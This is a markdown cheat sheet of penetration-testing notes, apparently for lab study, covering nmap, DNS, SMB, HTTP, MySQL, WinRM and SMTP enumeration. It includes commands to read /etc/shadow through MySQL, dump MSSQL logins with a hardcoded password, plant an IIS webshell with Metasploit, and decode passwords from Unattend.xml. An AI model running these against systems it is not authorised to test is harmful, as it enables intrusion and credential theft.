# Phase One - Information Gathering and Enumeration

## Web
### Tools
    - builtWith, WhatWeb, HTTrack, DNSrecon, dig, WAFWOOF, HTTPie, http

1. robots.txt, sitemap.xml, HTTP source, scripts, network, Dynamic languages PHP, CGI, login pages, enum directories
2. Whois, ```dnsenum WBESITE```, ```dig axfr WEBSITE @NAME_SERVER.```, ``` dig +short NS WEBSITE```

## Host Discovery and services
``` nmap --top-ports 7000, nmap -p-, nmap -sU```

## Banner
- nmap --script banner and nc IP_ADDRESS PORT

### Tools

1. fping, arp-scan, nmap (T4)(TCP, UDP), smbmap, msfconsole, nmblookup, smbclient, rpcclient, enum4linux, nc
 
``` 
sudo arp-scan -I eth0 -g SUBNET_ADDRESS/24
nmap -sn (no port scan)
nmap -Pn (assume host is up) -sC (default scripts)
nmap -sUV --script=discovery (futher information, used on filtered ports)
nmap smb scripts
smbmap -u -p -d . -H IP_ADDRESS (list shares and permissions)
smbclient -L IP_ADDRESS -U jane (prompted for password. see if browsable)
smbclient //IP_ADDRESS/jane -U jane (Connect to share. does share exist)
msfconsole smb (pipe_auditor)
nmblookup
enum4linux -r -u -p IP_ADDRESS (list RIDS users)
nmap --script ftp-anon IP_ADDRESS
nc IP_ADDRESS 22 (banner)
nmap 192.17.70.3 -p 22 --script ssh2-enum-algos 
dirb hxxp://IP_ADDRESS (HTTP)
browsh --startup-url hxxp://10.0.29.163/Default.aspx (terminal browser)
namp -p 80 -sV --script=http-enum IP_ADDRESS
nmap -p 80 -sV --script=http-methods --script-args=http-methods.url,path=/webdav/ (Get supported HTTP methods WEBDAV)
curl -X GET hxxp://IP_ADDRESS/
msfconsole>http_version
msfconsole>brute_dirs (HTTP brute dirs)
dirb (brute force web directories)
Try to login - mysql -h IP_ADDRESS -u root (#show databases, #desc user_table)
msfconsole>mysql_schemadump
mysql -h 192.71.145.3 -u root select load_file("/etc/shadow");
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" 10.0.30.33 -oN output.txt


```
## On Host
1. Interesting directories, /root, user home dir, /
2. host file, routing table, arp cache, current privs, processes, users, network info, getprivs, sysinfo, getuid
3. Enum users on system to TARGET SERVICES through brute force.
4. Perform search on system for file. 
``` sessions -i 1, find / -name "flag", cat /flag ``` 
## WebDav
- ``` nmap --script http-enum``` (Discover intereseting directories)
- ``` davtest -url hxxp://IP_ADDRESS``` and ``` -auth``` (will show auth type, eg basic)\
Can also use Metasploit iis_webshell 

## RDP
- Found unkown port, check if RDP ``` msfconsole>rdp_scanner```

## WinRM
- WinRM supports multiple auth methods, it is important to find which are supported. ``` >winrm_auth_methods```

## Using Powershell finding misconfigs
- PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers. PowerUp.ps1 aims to be a clearinghouse of common Windows privilege escalation vectors that rely
on misconfigurations
- C:\Windows\Panther\Unattend.xml
- Decode base64 
```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password 
``` 

## HTTP
- version\banner, header, robots, sitemap, brute dirs(dictonary, user file), PUT, login 
- The metasploit tool wmap (```>load wmap```) can be used to automatically test which modules will work agaist a web target, and then run all modules.
    - ``` wmap_sites -a 192.157.89.3, wmap_targets -t http://192.157.89.3, wmap_sites -l, wmap_run -t, wmap_run -e```
- ``` curl -X GET IP_ADDRESS```
- ``` curl -I IP_ADDRESS``` (sending HEAD)
- ``` curl -X OPTIONS IP_ADDRESS``` (sending OPTIONS)
- ``` curl IP_ADDRESS/DIR --upload-file file.txt```
- ``` curl -XDELETE ```


## MYSQL
- Some enumeration can be done without username and password but more can be done with a vaild username and password.

- mysql_version, mysql_enum, mysql_sql, mysql_file_enum, mysql_writable_dirs

## SMTP
-  Must be connected through netcat first. VRFY admin@openmailbox.xyz (tool allows us to check if admin is a user on the STMP system)
- Information command when communicating with a SMTP server. ``` Commands: telnet 192.26.29.3 25, HELO attacker.xyz, EHLO attacker.xyz```
- ``` #smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t 192.80.153.3```

## VSFTP
- ``` nmap --script vuln``` (search for vulns)
